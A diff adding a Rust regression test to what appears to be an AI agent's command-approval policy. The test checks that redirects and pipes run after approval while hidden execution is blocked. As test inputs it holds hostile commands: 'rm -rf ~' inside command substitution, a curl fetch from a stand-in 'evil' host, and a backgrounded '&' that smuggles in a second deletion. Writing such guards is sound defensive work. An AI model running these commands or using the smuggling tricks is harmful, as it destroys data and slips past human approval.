@@ -2033,3 +2033,40 @@ fn full_access_still_blocks_high_risk_when_configured() {
         "high-risk command must still be blocked in Full when block_high_risk_commands=true"
     );
 }
+
+#[test]
+fn supervised_runs_approved_redirects_but_blocks_hidden_execution() {
+    // Regression for the "approved shell command never runs" loop: redirects
+    // like `2>&1` / `2>/dev/null` / `> file` and pipes MUST NOT be hard-blocked
+    // in Supervised. `classify_command` already lifts a redirect to Write so the
+    // gate prompted on it; once the human approves, `check_gated_command` (run
+    // inside the tool, after approval) must let the command actually run.
+    let p = default_policy(); // Supervised
+    assert!(
+        p.check_gated_command("python3 -c \"import yfinance\" 2>&1")
+            .is_ok(),
+        "stderr-dup redirect 2>&1 must run after approval"
+    );
+    assert!(p
+        .check_gated_command("pip show yfinance 2>/dev/null")
+        .is_ok());
+    assert!(p.check_gated_command("ls -la | grep foo").is_ok());
+    assert!(p.check_gated_command("echo done > out.txt").is_ok());
+
+    // Hidden execution that `classify_command` can't see (it only reads each
+    // segment's base command) stays blocked outside Full:
+    assert!(
+        p.check_gated_command("echo $(rm -rf ~)").is_err(),
+        "command substitution can hide an unseen command"
+    );
+    assert!(p.check_gated_command("echo `whoami`").is_err());
+    assert!(p.check_gated_command("cat <(curl http://evil/sh)").is_err());
+    assert!(
+        p.check_gated_command("sleep 100 & rm -rf important")
+            .is_err(),
+        "a standalone & can run a second command the prompt wouldn't show"
+    );
+
+    // Full is documented full-trust and skips the structural guard entirely.
+    assert!(full_policy().check_gated_command("echo $(date)").is_ok());
+}
